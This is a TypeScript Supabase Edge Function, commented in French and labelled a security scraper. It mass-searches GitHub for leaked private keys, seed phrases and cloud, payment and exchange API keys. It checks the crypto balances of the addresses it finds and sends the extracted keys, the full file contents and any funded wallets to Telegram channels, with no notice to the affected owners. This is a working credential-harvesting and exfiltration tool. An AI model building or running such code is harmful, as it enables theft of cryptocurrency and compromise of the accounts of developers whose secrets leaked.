/**
 * Supabase Edge Function - GitHub Security Scraper
 * Avec logs live Telegram + Balance checking + 2 channels
 */

import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Configuration
const CHAT_ID_ALL = '-1003113285705';  // Channel "Find it"
const CHAT_ID_FUNDED = '-1002944547225';  // Channel "It's found"

// Helper IA - Analyse du danger avec Claude
async function analyzeWithAI(keyType: string, fullKey: string, content: string, blockchain: string): Promise<string> {
  const anthropicKey = Deno.env.get('ANTHROPIC_API_KEY');
  if (!anthropicKey) return '';

  try {
    const prompt = `Tu es un expert en cybersécurité crypto. Une clé privée ${keyType} (${blockchain}) a été trouvée publiquement sur GitHub.

Clé: ${fullKey.substring(0, 50)}...
Contexte: ${content.substring(0, 200)}...

Explique en 3-4 phrases COURTES:
1. Quel est le danger immédiat?
2. Que peut faire un attaquant avec ça?
3. Quels fonds/données sont en danger?

Sois DIRECT et ALARMISTE. Format: texte brut sans markdown.`;

    const response = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': anthropicKey,
        'anthropic-version': '2023-06-01',
      },
      body: JSON.stringify({
        model: 'claude-3-5-sonnet-20241022',
        max_tokens: 300,
        messages: [{
          role: 'user',
          content: prompt,
        }],
      }),
    });

    if (!response.ok) return '';

    const data = await response.json();
    return data.content?.[0]?.text || '';
  } catch (e) {
    console.error('AI analysis error:', e);
    return '';
  }
}

// Helper Telegram
async function sendTelegram(message: string, chatId: string) {
  const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
  if (!botToken) return;
  
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.error('Telegram error:', e);
  }
}

// Balance checker simple
async function checkBalance(codeSnippet: string) {
  try {
    // Extraire adresse Ethereum
    const ethMatch = codeSnippet.match(/0x[a-fA-F0-9]{40}/);
    if (ethMatch) {
      const address = ethMatch[0];
      const res = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest`);
      const data = await res.json();
      if (data.status === '1' && data.result) {
        const balanceETH = Number(BigInt(data.result)) / 1e18;
        if (balanceETH > 0) {
          const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
          const priceData = await priceRes.json();
          const priceUSD = priceData.ethereum?.usd || 0;
          return {
            hasBalance: true,
            balance: balanceETH.toFixed(6),
            balanceUSD: balanceETH * priceUSD,
            currency: 'ETH',
            blockchain: 'Ethereum',
            address,
          };
        }
      }
    }

    // Extraire adresse Bitcoin
    const btcMatch = codeSnippet.match(/([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/);
    if (btcMatch) {
      const address = btcMatch[1];
      const res = await fetch(`https://api.blockcypher.com/v1/btc/main/addrs/${address}/balance`);
      const data = await res.json();
      if (data.final_balance) {
        const balanceBTC = data.final_balance / 1e8;
        if (balanceBTC > 0) {
          const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
          const priceData = await priceRes.json();
          const priceUSD = priceData.bitcoin?.usd || 0;
          return {
            hasBalance: true,
            balance: balanceBTC.toFixed(8),
            balanceUSD: balanceBTC * priceUSD,
            currency: 'BTC',
            blockchain: 'Bitcoin',
            address,
          };
        }
      }
    }

    return { hasBalance: false };
  } catch (e) {
    return { hasBalance: false, error: e.message };
  }
}

// Extraire clé complète
function extractFullKey(text: string): string {
  const patterns = [
    /(?:PRIVATE_KEY|WALLET_KEY|SECRET_KEY)[=:\s]*["']?([a-fA-F0-9]{64}|0x[a-fA-F0-9]{64})["']?/i,
    /(0x[a-fA-F0-9]{40})/,
    /([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/,
    /([a-zA-Z0-9+/=_-]{40,})/,
  ];

  for (const p of patterns) {
    const m = text.match(p);
    if (m) return m[1] || m[0];
  }

  return text.substring(0, 200);
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders });
  }

  const startTime = Date.now();

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

    const githubToken = Deno.env.get('GITHUB_TOKEN');
    if (!githubToken) throw new Error('GITHUB_TOKEN not configured');

    // LOG: Démarrage
    const scanId = crypto.randomUUID().substring(0, 8);
    await sendTelegram(`
🚀 *SCAN DÉMARRÉ*

🆔 ID: \`${scanId}\`
⏰ ${new Date().toLocaleTimeString('fr-FR')}

⏳ Chargement des patterns...
    `.trim(), CHAT_ID_ALL);

    // Créer scan history
    const { data: scan } = await supabase
      .from('github_scan_history')
      .insert({ scan_type: 'code', query: 'Auto scan', status: 'running', started_at: new Date().toISOString() })
      .select('id')
      .single();

    const scanDbId = scan?.id;

    // Charger patterns
    const { data: patterns } = await supabase
      .from('github_sensitive_patterns')
      .select('*')
      .eq('is_active', true);

    // LOG: Patterns chargés
    await sendTelegram(`
✅ *Patterns Chargés*

📊 ${patterns?.length || 0} patterns actifs
🔍 Démarrage du scan GitHub...
    `.trim(), CHAT_ID_ALL);

    // RECHERCHES ULTRA-AGRESSIVES : Maximum de variations
    const queries = [
      // Clés privées crypto
      'PRIVATE_KEY in:file',
      'WALLET_KEY in:file',
      'SECRET_KEY in:file',
      'ETH_PRIVATE_KEY in:file',
      'BITCOIN_PRIVATE_KEY in:file',
      'SOLANA_PRIVATE_KEY in:file',
      
      // Mnemonics
      'MNEMONIC in:file',
      'SEED_PHRASE in:file',
      'RECOVERY_PHRASE in:file',
      
      // Exchanges crypto
      'BINANCE_API_KEY in:file',
      'BINANCE_SECRET_KEY in:file',
      'COINBASE_API_KEY in:file',
      'KRAKEN_API_KEY in:file',
      
      // Payment processors
      'STRIPE_SECRET_KEY in:file',
      'PAYPAL_CLIENT_SECRET in:file',
      'sk_live_ in:file',
      
      // Cloud providers
      'AWS_SECRET_ACCESS_KEY in:file',
      'AWS_ACCESS_KEY_ID in:file',
      'GOOGLE_CLOUD_API_KEY in:file',
      'AZURE_CLIENT_SECRET in:file',
      
      // AI APIs
      'OPENAI_API_KEY in:file',
      'ANTHROPIC_API_KEY in:file',
      'sk-proj- in:file',
      
      // Auth & JWT
      'JWT_SECRET in:file',
      'SESSION_SECRET in:file',
      
      // Databases
      'MONGODB_URI in:file',
      'POSTGRES_PASSWORD in:file',
      'MYSQL_ROOT_PASSWORD in:file',
      
      // Fichiers spécifiques
      'filename:.env',
      'filename:.env.local',
      'filename:.env.production',
      'filename:.env.development',
      'filename:.env.staging',
      'filename:config.json',
      'filename:secrets.json',
      'filename:credentials.json',
      'filename:secrets.txt',
      'filename:config.yml',
      'filename:secrets.yml',
      
      // Patterns combinés
      'private key in:file extension:env',
      'api key in:file extension:env',
      'secret in:file extension:env',
    ];

    let totalResults = 0;
    let findingsCount = 0;
    let fundedCount = 0;

    for (const query of queries) {
      // LOG: Query start
      await sendTelegram(`🔎 *Recherche:* \`${query}\`\n⏳ En cours...`, CHAT_ID_ALL);

      // Recherche avec PAGINATION pour avoir plus de résultats (max 100 par query)
      const searchRes = await fetch(
        `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100&sort=indexed&order=desc`,
        { headers: { Authorization: `token ${githubToken}`, Accept: 'application/vnd.github.v3+json' } }
      );

      if (!searchRes.ok) {
        // Check rate limit
        const rateLimitRemaining = searchRes.headers.get('x-ratelimit-remaining');
        if (rateLimitRemaining && parseInt(rateLimitRemaining) < 2) {
          await sendTelegram(`⚠️ *Rate limit proche*\n\nRestant: ${rateLimitRemaining}\nPause temporaire...`, CHAT_ID_ALL);
          break;  // Stop si rate limit proche
        }
        continue;
      }

      const searchData = await searchRes.json();
      totalResults += searchData.items?.length || 0;

      // LOG: Results
      await sendTelegram(`📊 *${searchData.items?.length || 0} résultats* trouvés\n🔍 Analyse...`, CHAT_ID_ALL);

      for (const item of searchData.items || []) {
        try {
          const contentRes = await fetch(
            `https://api.github.com/repos/${item.repository.full_name}/contents/${item.path}`,
            { headers: { Authorization: `token ${githubToken}`, Accept: 'application/vnd.github.v3.raw' } }
          );

          if (!contentRes.ok) continue;

          const content = await contentRes.text();

          for (const pattern of patterns || []) {
            const regex = new RegExp(pattern.pattern_regex, 'gi');
            const matches = content.match(regex);

            if (matches && matches.length > 0) {
              // Check if exists
              const { data: existing } = await supabase
                .from('github_security_findings')
                .select('id')
                .eq('repository_url', item.repository.html_url)
                .eq('file_path', item.path)
                .limit(1);

              if (existing && existing.length > 0) continue;

              // Create finding
              await supabase.from('github_security_findings').insert({
                scan_id: scanDbId,
                pattern_id: pattern.id,
                repository_url: item.repository.html_url,
                repository_name: item.repository.full_name,
                repository_owner: item.repository.owner.login,
                file_path: item.path,
                code_snippet: content.substring(0, 500),
                matched_pattern: matches[0].substring(0, 50),
                pattern_type: pattern.pattern_type,
                severity: pattern.severity,
                status: 'new',
                metadata: { match_count: matches.length, file_url: item.html_url },
              });

              findingsCount++;

              const fullKey = extractFullKey(content);
              const balanceInfo = await checkBalance(content);

              // Préparer le contenu COMPLET du fichier (max 3000 chars pour Telegram)
              const fileContent = content.length > 3000 ? content.substring(0, 3000) + '\n\n... (tronqué)' : content;

              // LOG LIVE: Finding détecté - CONTENU COMPLET
              const emoji = pattern.severity === 'critical' ? '🔴' : pattern.severity === 'high' ? '🟠' : '🟡';
              
              // Message 1 : Info du finding
              let msg1 = `
${emoji} *FINDING #${findingsCount}* ${balanceInfo.hasBalance ? '💰' : ''}

🔍 [${item.repository.full_name}](${item.repository.html_url})
📁 \`${item.path}\`
👤 @${item.repository.owner.login}

📋 ${pattern.pattern_type} | ${pattern.severity.toUpperCase()}
⏰ ${new Date().toLocaleTimeString('fr-FR')}
              `.trim();

              if (balanceInfo.hasBalance) {
                fundedCount++;
                msg1 += `\n\n💰 *BALANCE DÉTECTÉE !*\n💵 ${balanceInfo.balance} ${balanceInfo.currency}\n💲 $${balanceInfo.balanceUSD?.toFixed(2)}\n⛓️ ${balanceInfo.blockchain}`;
              }

              msg1 += `\n\n🔗 [Voir le fichier](${item.html_url})`;

              // Message 2 : CONTENU BRUT COMPLET du fichier
              const msg2 = `
📄 *CONTENU COMPLET DU FICHIER:*

\`\`\`
${fileContent}
\`\`\`

🔑 *Clé extraite:* \`${fullKey}\`

📋 Vous pouvez copier le contenu ci-dessus pour analyse manuelle.
              `.trim();

              // Envoyer les 2 messages vers channel ALL
              await sendTelegram(msg1, CHAT_ID_ALL);
              await sendTelegram(msg2, CHAT_ID_ALL);

              // Détecter si c'est une clé privée crypto
              const isCryptoPrivateKey = [
                'private_key', 'wallet_key', 'secret_key',
                'eth_private_key', 'ethereum_private_key',
                'bitcoin_private_key', 'btc_private_key',
                'solana_private_key', 'sol_private_key',
                'mnemonic', 'seed_phrase', 'recovery_phrase',
                'binance_api_key', 'binance_secret',
                'coinbase_api', 'kraken_api',
              ].some(keyword => 
                pattern.pattern_type.toLowerCase().includes(keyword) ||
                pattern.pattern_name.toLowerCase().includes(keyword)
              );

              // ENVOI AUTOMATIQUE au canal FUNDED pour:
              // 1. Si balance > 0
              // 2. OU si c'est une clé privée crypto (NOUVEAU)
              if (balanceInfo.hasBalance || isCryptoPrivateKey) {
                // Déterminer la blockchain potentielle
                let blockchain = 'Unknown';
                const patternLower = pattern.pattern_type.toLowerCase();
                if (patternLower.includes('eth') || patternLower.includes('ethereum')) {
                  blockchain = '⟠ Ethereum';
                } else if (patternLower.includes('btc') || patternLower.includes('bitcoin')) {
                  blockchain = '₿ Bitcoin';
                } else if (patternLower.includes('sol') || patternLower.includes('solana')) {
                  blockchain = '◎ Solana';
                } else if (patternLower.includes('mnemonic') || patternLower.includes('seed')) {
                  blockchain = '🔑 Multi-chain (BIP39)';
                } else if (patternLower.includes('binance')) {
                  blockchain = '🅱️ Binance';
                } else if (patternLower.includes('coinbase')) {
                  blockchain = '🟦 Coinbase';
                } else {
                  blockchain = '🔐 Crypto Wallet';
                }

                // ANALYSE IA du danger
                await sendTelegram(`🤖 *Analyse IA en cours...*`, CHAT_ID_FUNDED);
                const aiAnalysis = await analyzeWithAI(pattern.pattern_type, fullKey, content, blockchain);

                // Message SIMPLE et BRUT avec IA
                let fundedMsg = '';
                
                if (balanceInfo.hasBalance) {
                  // Cas 1: Balance détectée
                  fundedMsg = `
🚨 *BALANCE POSITIVE !* 🚨

💰 *${balanceInfo.balance} ${balanceInfo.currency}* ($${balanceInfo.balanceUSD?.toFixed(2)})
⛓️ ${balanceInfo.blockchain}

🔑 *CLÉ:*
\`${fullKey}\`

📍 ${item.repository.full_name}
👤 @${item.repository.owner.login}
                  `.trim();
                } else {
                  // Cas 2: Clé privée crypto (sans balance vérifiée)
                  fundedMsg = `
🔑 *CLÉ PRIVÉE CRYPTO*

⛓️ ${blockchain}

🔑 *CLÉ:*
\`${fullKey}\`

📍 ${item.repository.full_name}
👤 @${item.repository.owner.login}
                  `.trim();
                }

                await sendTelegram(fundedMsg, CHAT_ID_FUNDED);

                // Message IA séparé
                if (aiAnalysis) {
                  const aiMsg = `
⚠️ *ANALYSE IA - DANGER*

${aiAnalysis}

🔗 [Voir le repo](${item.repository.html_url})
                  `.trim();
                  await sendTelegram(aiMsg, CHAT_ID_FUNDED);
                }
                if (balanceInfo.hasBalance) {
                  fundedCount++;
                }
              }
            }
          }
        } catch (e) {
          console.error('Item error:', e);
        }
      }
    }

    // Update scan
    if (scanDbId) {
      await supabase
        .from('github_scan_history')
        .update({
          status: 'completed',
          completed_at: new Date().toISOString(),
          total_results: totalResults,
          findings_count: findingsCount,
        })
        .eq('id', scanDbId);
    }

    const duration = Math.round((Date.now() - startTime) / 1000);

    // LOG FINAL
    await sendTelegram(`
✅ *SCAN TERMINÉ*

📊 *Résultats:*
\`\`\`
Résultats  : ${totalResults}
Findings   : ${findingsCount}
Avec fonds : ${fundedCount}
Durée      : ${duration}s
\`\`\`

⏰ Prochain scan : Dans 15 minutes
    `.trim(), CHAT_ID_ALL);

    return new Response(
      JSON.stringify({ success: true, findingsCount, fundedCount, totalResults }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 200 }
    );
  } catch (error: any) {
    await sendTelegram(`❌ *ERREUR*\n\n${error.message}`, CHAT_ID_ALL);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 500 }
    );
  }
});